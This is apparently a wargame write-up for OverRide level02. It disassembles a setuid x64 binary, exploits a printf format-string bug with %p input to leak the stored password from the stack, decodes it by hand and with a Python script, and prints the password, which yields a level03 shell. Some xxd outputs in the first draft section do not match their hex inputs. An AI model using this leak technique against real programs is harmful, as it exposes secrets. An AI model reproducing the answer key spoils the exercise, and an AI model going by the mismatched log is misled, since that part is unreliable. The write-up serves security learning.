# level02 - string format vulnerabily


this is a x64 binary, require an ethantication to get the next level access.



```bash
(gdb) disas main 
Dump of assembler code for function main:
   0x0000000000400814 <+0>:	push   %rbp
   0x0000000000400815 <+1>:	mov    %rsp,%rbp
   0x0000000000400818 <+4>:	sub    $0x120,%rsp
   0x000000000040081f <+11>:	mov    %edi,-0x114(%rbp)
   0x0000000000400825 <+17>:	mov    %rsi,-0x120(%rbp)
   0x000000000040082c <+24>:	lea    -0x70(%rbp),%rdx
   0x0000000000400830 <+28>:	mov    $0x0,%eax
   0x0000000000400835 <+33>:	mov    $0xc,%ecx
   0x000000000040083a <+38>:	mov    %rdx,%rdi
   0x000000000040083d <+41>:	rep stos %rax,%es:(%rdi)
   0x0000000000400840 <+44>:	mov    %rdi,%rdx
   0x0000000000400843 <+47>:	mov    %eax,(%rdx)
   0x0000000000400845 <+49>:	add    $0x4,%rdx
   0x0000000000400849 <+53>:	lea    -0xa0(%rbp),%rdx
   0x0000000000400850 <+60>:	mov    $0x0,%eax
   0x0000000000400855 <+65>:	mov    $0x5,%ecx
   0x000000000040085a <+70>:	mov    %rdx,%rdi
   0x000000000040085d <+73>:	rep stos %rax,%es:(%rdi)
   0x0000000000400860 <+76>:	mov    %rdi,%rdx
   0x0000000000400863 <+79>:	mov    %al,(%rdx)
   0x0000000000400865 <+81>:	add    $0x1,%rdx
   0x0000000000400869 <+85>:	lea    -0x110(%rbp),%rdx
   0x0000000000400870 <+92>:	mov    $0x0,%eax
   0x0000000000400875 <+97>:	mov    $0xc,%ecx
   0x000000000040087a <+102>:	mov    %rdx,%rdi
   0x000000000040087d <+105>:	rep stos %rax,%es:(%rdi)
   0x0000000000400880 <+108>:	mov    %rdi,%rdx
   0x0000000000400883 <+111>:	mov    %eax,(%rdx)
   0x0000000000400885 <+113>:	add    $0x4,%rdx
   0x0000000000400889 <+117>:	movq   $0x0,-0x8(%rbp)
   0x0000000000400891 <+125>:	movl   $0x0,-0xc(%rbp)
   0x0000000000400898 <+132>:	mov    $0x400bb0,%edx ; load file path
   0x000000000040089d <+137>:	mov    $0x400bb2,%eax ; permision option 
   0x00000000004008a2 <+142>:	mov    %rdx,%rsi
   0x00000000004008a5 <+145>:	mov    %rax,%rdi
   0x00000000004008a8 <+148>:	callq  0x400700 <fopen@plt> open file
   0x00000000004008ad <+153>:	mov    %rax,-0x8(%rbp)
   0x00000000004008b1 <+157>:	cmpq   $0x0,-0x8(%rbp)
   0x00000000004008b6 <+162>:	jne    0x4008e6 <main+210>
   0x00000000004008b8 <+164>:	mov    0x200991(%rip),%rax        # 0x601250 <stderr@@GLIBC_2.2.5>
   0x00000000004008bf <+171>:	mov    %rax,%rdx
   0x00000000004008c2 <+174>:	mov    $0x400bd0,%eax
   0x00000000004008c7 <+179>:	mov    %rdx,%rcx
   0x00000000004008ca <+182>:	mov    $0x24,%edx
   0x00000000004008cf <+187>:	mov    $0x1,%esi
   0x00000000004008d4 <+192>:	mov    %rax,%rdi
   0x00000000004008d7 <+195>:	callq  0x400720 <fwrite@plt>
   0x00000000004008dc <+200>:	mov    $0x1,%edi
   0x00000000004008e1 <+205>:	callq  0x400710 <exit@plt>
   0x00000000004008e6 <+210>:	lea    -0xa0(%rbp),%rax
   0x00000000004008ed <+217>:	mov    -0x8(%rbp),%rdx
   0x00000000004008f1 <+221>:	mov    %rdx,%rcx
   0x00000000004008f4 <+224>:	mov    $0x29,%edx
   0x00000000004008f9 <+229>:	mov    $0x1,%esi
   0x00000000004008fe <+234>:	mov    %rax,%rdi
   0x0000000000400901 <+237>:	callq  0x400690 <fread@plt> ; read the file content if executed with the right permision 
   0x0000000000400906 <+242>:	mov    %eax,-0xc(%rbp)
   0x0000000000400909 <+245>:	lea    -0xa0(%rbp),%rax
   0x0000000000400910 <+252>:	mov    $0x400bf5,%esi
   0x0000000000400915 <+257>:	mov    %rax,%rdi
   0x0000000000400918 <+260>:	callq  0x4006d0 <strcspn@plt>
   0x000000000040091d <+265>:	movb   $0x0,-0xa0(%rbp,%rax,1)
   0x0000000000400925 <+273>:	cmpl   $0x29,-0xc(%rbp)
   0x0000000000400929 <+277>:	je     0x40097d <main+361>
   0x000000000040092b <+279>:	mov    0x20091e(%rip),%rax        # 0x601250 <stderr@@GLIBC_2.2.5>
   0x0000000000400932 <+286>:	mov    %rax,%rdx
   0x0000000000400935 <+289>:	mov    $0x400bf8,%eax
   0x000000000040093a <+294>:	mov    %rdx,%rcx
   0x000000000040093d <+297>:	mov    $0x24,%edx
   0x0000000000400942 <+302>:	mov    $0x1,%esi
   0x0000000000400947 <+307>:	mov    %rax,%rdi
   0x000000000040094a <+310>:	callq  0x400720 <fwrite@plt>
   0x000000000040094f <+315>:	mov    0x2008fa(%rip),%rax        # 0x601250 <stderr@@GLIBC_2.2.5>
   0x0000000000400956 <+322>:	mov    %rax,%rdx
   0x0000000000400959 <+325>:	mov    $0x400bf8,%eax
   0x000000000040095e <+330>:	mov    %rdx,%rcx
   0x0000000000400961 <+333>:	mov    $0x24,%edx
   0x0000000000400966 <+338>:	mov    $0x1,%esi
   0x000000000040096b <+343>:	mov    %rax,%rdi
   0x000000000040096e <+346>:	callq  0x400720 <fwrite@plt>
   0x0000000000400973 <+351>:	mov    $0x1,%edi
   0x0000000000400978 <+356>:	callq  0x400710 <exit@plt>
   0x000000000040097d <+361>:	mov    -0x8(%rbp),%rax
   0x0000000000400981 <+365>:	mov    %rax,%rdi
   0x0000000000400984 <+368>:	callq  0x4006a0 <fclose@plt>
   0x0000000000400989 <+373>:	mov    $0x400c20,%edi
   0x000000000040098e <+378>:	callq  0x400680 <puts@plt>
   0x0000000000400993 <+383>:	mov    $0x400c50,%edi
   0x0000000000400998 <+388>:	callq  0x400680 <puts@plt>
   0x000000000040099d <+393>:	mov    $0x400c80,%edi
   0x00000000004009a2 <+398>:	callq  0x400680 <puts@plt>
   0x00000000004009a7 <+403>:	mov    $0x400cb0,%edi
   0x00000000004009ac <+408>:	callq  0x400680 <puts@plt>
   0x00000000004009b1 <+413>:	mov    $0x400cd9,%eax
   0x00000000004009b6 <+418>:	mov    %rax,%rdi
   0x00000000004009b9 <+421>:	mov    $0x0,%eax
   0x00000000004009be <+426>:	callq  0x4006c0 <printf@plt>
   0x00000000004009c3 <+431>:	mov    0x20087e(%rip),%rax        # 0x601248 <stdin@@GLIBC_2.2.5>
   0x00000000004009ca <+438>:	mov    %rax,%rdx
   0x00000000004009cd <+441>:	lea    -0x70(%rbp),%rax 
   0x00000000004009d1 <+445>:	mov    $0x64,%esi
   0x00000000004009d6 <+450>:	mov    %rax,%rdi
   0x00000000004009d9 <+453>:	callq  0x4006f0 <fgets@plt> ; read username input (0x64) 100 byte 
   0x00000000004009de <+458>:	lea    -0x70(%rbp),%rax
   0x00000000004009e2 <+462>:	mov    $0x400bf5,%esi
   0x00000000004009e7 <+467>:	mov    %rax,%rdi
   0x00000000004009ea <+470>:	callq  0x4006d0 <strcspn@plt>
   0x00000000004009ef <+475>:	movb   $0x0,-0x70(%rbp,%rax,1)
   0x00000000004009f4 <+480>:	mov    $0x400ce8,%eax
   0x00000000004009f9 <+485>:	mov    %rax,%rdi
   0x00000000004009fc <+488>:	mov    $0x0,%eax
   0x0000000000400a01 <+493>:	callq  0x4006c0 <printf@plt>
   0x0000000000400a06 <+498>:	mov    0x20083b(%rip),%rax        # 0x601248 <stdin@@GLIBC_2.2.5>
   0x0000000000400a0d <+505>:	mov    %rax,%rdx
   0x0000000000400a10 <+508>:	lea    -0x110(%rbp),%rax
   0x0000000000400a17 <+515>:	mov    $0x64,%esi
   0x0000000000400a1c <+520>:	mov    %rax,%rdi
   0x0000000000400a1f <+523>:	callq  0x4006f0 <fgets@plt> ; read 100 (0x64) password input
   0x0000000000400a2b <+535>:	mov    $0x400bf5,%esi
   0x0000000000400a30 <+540>:	mov    %rax,%rdi
   0x0000000000400a33 <+543>:	callq  0x4006d0 <strcspn@plt>
   0x0000000000400a38 <+548>:	movb   $0x0,-0x110(%rbp,%rax,1)
   0x0000000000400a40 <+556>:	mov    $0x400cf8,%edi
   0x0000000000400a45 <+561>:	callq  0x400680 <puts@plt>
   0x0000000000400a4a <+566>:	lea    -0x110(%rbp),%rcx ; load the password input 
   0x0000000000400a51 <+573>:	lea    -0xa0(%rbp),%rax ; load the file content (password we need)
   0x0000000000400a58 <+580>:	mov    $0x29,%edx
   0x0000000000400a5d <+585>:	mov    %rcx,%rsi
   0x0000000000400a60 <+588>:	mov    %rax,%rdi
   0x0000000000400a63 <+591>:	callq  0x400670 <strncmp@plt> ; compair passwords
   0x0000000000400a68 <+596>:	test   %eax,%eax
   0x0000000000400a6a <+598>:	jne    0x400a96 <main+642>; jump if the wrong password
   0x0000000000400a6c <+600>:	mov    $0x400d22,%eax
   0x0000000000400a71 <+605>:	lea    -0x70(%rbp),%rdx ; load username addres 
   0x0000000000400a75 <+609>:	mov    %rdx,%rsi ; username as second argument 
   0x0000000000400a78 <+612>:	mov    %rax,%rdi ; format string as firs argument 
   0x0000000000400a7b <+615>:	mov    $0x0,%eax
   0x0000000000400a80 <+620>:	callq  0x4006c0 <printf@plt> ; safe print
   0x0000000000400a85 <+625>:	mov    $0x400d32,%edi
   0x0000000000400a8a <+630>:	callq  0x4006b0 <system@plt> ; execute "/bin/sh" if the password correct 
   0x0000000000400a8f <+635>:	mov    $0x0,%eax
   0x0000000000400a94 <+640>:	leaveq 
   0x0000000000400a95 <+641>:	retq   
   0x0000000000400a96 <+642>:	lea    -0x70(%rbp),%rax ; load the username after jump
   0x0000000000400a9a <+646>:	mov    %rax,%rdi ; username as first argument !!!! %p can be used here 
   0x0000000000400a9d <+649>:	mov    $0x0,%eax
   0x0000000000400aa2 <+654>:	callq  0x4006c0 <printf@plt>; ; VULNERABLE: printf(username)
   0x0000000000400aa7 <+659>:	mov    $0x400d3a,%edi
   0x0000000000400aac <+664>:	callq  0x400680 <puts@plt>
   0x0000000000400ab1 <+669>:	mov    $0x1,%edi
   0x0000000000400ab6 <+674>:	callq  0x400710 <exit@plt>
End of assembler dump.
```

the program load the file content to 0xa0 and the username at 0x70 which give 48 byte offset , based on distance from RBP it must be at position 6+


lets test
```bash 

level02@OverRide:~$ python -c "print('%p ' * 20)" | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe4f0 (nil) (nil) 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000  does not have access!
```
there is nothing look like password here 

```bash

level02@OverRide:~$ python -c "print('%p ' * 30)" | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe4f0 (nil) (nil) 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d 0xfeff00 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
```
here we go the password 5 Qwords which musch what we may expect , but wait it is alittle further from what we expected 
level02@OverRide:~$ echo "0x756e505234376848" | xxd -r -p
unPR47hHlevel02@OverRide:~$ echo "0x45414a3561733951" | xxd -r -p
5J5hnGXslevel02@OverRide:~$ echo "0x377a7143574e6758" | xxd -r -p
H3gPfK9Mlevel02@OverRide:~$ echo "0x354a35686e475873" | xxd -r -p
��level02@OverRide:~$ echo "0x48336750664b394d" | xxd -r -p
EAJ5as9Qlevel02@OverRide:~$ echo "0x2070252070252070" | xxd -r -p
 p% p% plevel02@OverRide:~$ echo "0xfeff00" | xxd -r -p
7zqCWNgXlevel02@OverRide:~$ echo "0x45414a3561733951" | xxd -r -p
EAJ5as9Qlevel02@OverRide:~$ echo "0x756e505234376848" | xxd -r -p
unPR47hHlevel02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: mchlhay
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
*****************************************
Greetings, mchlhay!



# Level02 - Format String Vulnerability

## Binary Analysis

This is an **x64 binary** that requires authentication to access the next level.

```bash
ls -la
-rwsr-s---+ 1 level03 users  7503 Sep 10  2016 level02
```

### Program Behavior

1. Opens and reads `/home/users/level03/.pass` file
2. Prompts for username input
3. Prompts for password input  
4. Compares password with file contents
5. If correct: prints success and spawns shell
6. If wrong: prints username and exits

### Key Code Analysis

```bash
; File operations
0x400898 <+132>: mov    $0x400bb0,%edx    ; "r"
0x40089d <+137>: mov    $0x400bb2,%eax    ; "/home/users/level03/.pass"
0x4008a8 <+148>: callq  0x400700 <fopen@plt>
0x400901 <+237>: callq  0x400690 <fread@plt>  ; Read 0x29 (41) bytes

; Username input
0x4009cd <+441>: lea    -0x70(%rbp),%rax     ; Username buffer at RBP-0x70
0x4009d1 <+445>: mov    $0x64,%esi           ; 100 bytes allowed
0x4009d9 <+453>: callq  0x4006f0 <fgets@plt>

; Password input
0x400a10 <+508>: lea    -0x110(%rbp),%rax    ; Password buffer at RBP-0x110
0x400a17 <+515>: mov    $0x64,%esi           ; 100 bytes allowed
0x400a1f <+523>: callq  0x4006f0 <fgets@plt>

; Comparison
0x400a4a <+566>: lea    -0x110(%rbp),%rcx    ; Our password input
0x400a51 <+573>: lea    -0xa0(%rbp),%rax     ; File password (RBP-0xa0)
0x400a58 <+580>: mov    $0x29,%edx           ; Compare 41 bytes (5 qword password we want)
0x400a63 <+591>: callq  0x400670 <strncmp@plt>
0x400a68 <+596>: test   %eax,%eax
0x400a6a <+598>: jne    0x400a96 <main+642>  ; Jump if wrong

; Success path (correct password)
0x400a71 <+605>: lea    -0x70(%rbp),%rdx     ; Username
0x400a75 <+609>: mov    %rdx,%rsi
0x400a78 <+612>: mov    %rax,%rdi            ; Format string
0x400a80 <+620>: callq  0x4006c0 <printf@plt>; Safe: printf(format, username)
0x400a8a <+630>: callq  0x4006b0 <system@plt>; Spawn shell

; Failure path (wrong password)
0x400a96 <+642>: lea    -0x70(%rbp),%rax     ; Username
0x400a9a <+646>: mov    %rax,%rdi
0x400aa2 <+654>: callq  0x4006c0 <printf@plt>; VULNERABLE: printf(username)
0x400aac <+664>: callq  0x400680 <puts@plt>  ; "does not have access!"
```

## Vulnerability: Format String Exploit

The vulnerability is at `0x400aa2`:
```c
printf(username);  // No format string! Direct user input to printf
```

This allows us to use format specifiers like `%p` to leak stack memory.

## Memory Layout

```
High Memory
|-------------------------|
|   Return Address        |
|-------------------------|
|   Saved RBP             |
|-------------------------|
|   ...                   |
|-------------------------|
|   Password from file    | ← RBP-0xa0 (41 bytes of flag)
|   (41 bytes)            |   THIS IS WHAT WE WANT!
|-------------------------|
|   ...                   |
|   (48 bytes gap)        |
|   ...                   |
|-------------------------|
|   Username buffer       | ← RBP-0x70 (our input with %p)
|   (100 bytes)           |
|-------------------------|
|   ...                   |
|-------------------------|
|   Password input buffer | ← RBP-0x110 (not used in exploit)
|   (100 bytes)           |
|-------------------------|
Low Memory
```

### Buffer Offsets

- Username buffer: `RBP-0x70`
- File password: `RBP-0xa0`
- Password input: `RBP-0x110`

**Byte distance**: `0xa0 - 0x70 = 0x30 = 48 bytes`

48 / 8 = 6 so i expect the password start at index 7+ 

will this is not the actual offset we have format string x64 call

## Format String Position Calculation

### x64 Calling Convention

In x64 architecture, the first 6 arguments are passed in registers:
1. `%rdi` - 1st argument (format string pointer - our username)
2. `%rsi` - 2nd argument
3. `%rdx` - 3rd argument
4. `%rcx` - 4th argument
5. `%r8` - 5th argument
6. `%r9` - 6th argument
7+. Stack arguments (starting at `RSP`)

When we use `%p` format specifiers:
- `%p` #1-6: Read from registers
- `%p` #7+: Read from stack

### Why Position 21, Not 6?

**Initial calculation** (misleading again):
```
Byte offset: 48 bytes
Qword offset: 48 / 8 = 6 qwords
Expected position: 6 + 6 (registers) = 12?
```

**But this is wrong!** The 48-byte offset is from `RBP`, not from where `RSP` points during `printf`.

### Finding the Correct Position

Test with increasing `%p` count:

```bash
# Try position 20
python -c "print('%p ' * 20)" | ./level02
# Output shows positions 1-20, but no password yet

# Try position 30
python -c "print('%p ' * 30)" | ./level02
# Position 21-25 show hex values that look like ASCII!
```

**Result**: Password appears at **positions 21-25** (5 qwords for 41 bytes)

### Stack Frame Analysis

The actual stack layout when `printf` is called:

```
RSP (during printf) → [various local variables and saved registers]
                      [14 qwords of stack data]          ← Positions 7-20
                      [Password from file - 5 qwords]    ← Positions 21-25 
                      [more stack data]
```

The password is **15 qwords away** from RSP, which means:
- 6 register positions (1-6)
- 14 stack positions (7-20)
- **Position 21 starts the password!**

## Exploitation

### Method 1: Manual Extraction

```bash
level02@OverRide:~$ python -c "print('%p ' * 30)" | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe4f0 (nil) (nil) 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 
0x7fffffffe6e8 0x1f7ff9a08 (nil) (nil) (nil) (nil) (nil) (nil) (nil) 
(nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 
0x756e505234376848    ← Position 21
0x45414a3561733951    ← Position 22
0x377a7143574e6758    ← Position 23
0x354a35686e475873    ← Position 24
0x48336750664b394d    ← Position 25
0xfeff00 0x7025207025207025 0x2520702520702520 0x2070252070252070  
does not have access!
```

### Manual Conversion (Understanding Little-Endian)

The hex values are stored in **little-endian** format (least significant byte first):

```bash
# Position 21: 0x756e505234376848
# Read bytes right to left: 48 68 37 34 52 50 6e 75
echo "48 68 37 34 52 50 6e 75" | xxd -r -p; echo
# Output: Hh74RPnu

# Position 22: 0x45414a3561733951
echo "51 39 73 61 35 4a 41 45" | xxd -r -p; echo
# Output: Q9sa5JAE

# Position 23: 0x377a7143574e6758
echo "58 67 4e 57 43 71 7a 37" | xxd -r -p; echo
# Output: XgNWCqz7

# Position 24: 0x354a35686e475873
echo "73 58 47 6e 68 35 4a 35" | xxd -r -p; echo
# Output: sXGnh5J5

# Position 25: 0x48336750664b394d
echo "4d 39 4b 66 50 67 33 48" | xxd -r -p; echo
# Output: M9KfPg3H
```

in this case w need to revert all the bytes one by one from little-indian 

### Method 2: Automated Password Extraction

we can put this python script at /tmp and run it to get the password as string 

```python

#!/usr/bin/env python2
import subprocess
import struct
import re

cmd = 'python -c "print(\'%p \' * 30)" | /home/users/level02/level02 | awk \'{for(i=21;i<=26;i++) printf $(i)" "; print ""}\''
process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
output, _ = process.communicate()
output = output.decode().strip()

print("Raw extracted values (positions 21-25): {}".format(output))

hex_values = re.findall(r'0x[0-9a-f]+', output)

print("\nPassword hex values (positions 21-25):")
for i, hex_val in enumerate(hex_values, 21):
    print("Position {}: {}".format(i, hex_val))

password = ""
for hex_val in hex_values:
    val = int(hex_val, 16)
    try:
        ascii_bytes = struct.pack('<Q', val)
        for byte in ascii_bytes:
            if 32 <= ord(byte) <= 126:
                password += byte
    except:
        pass

print("\nExtracted Password: {}".format(password))
print("Length: {} characters".format(len(password)))
```

**Complete password**: `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`

## Verification

```bash
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: anything
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
*****************************************
Greetings, anything!
$ whoami
level03
$ cat /home/users/level03/.pass
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```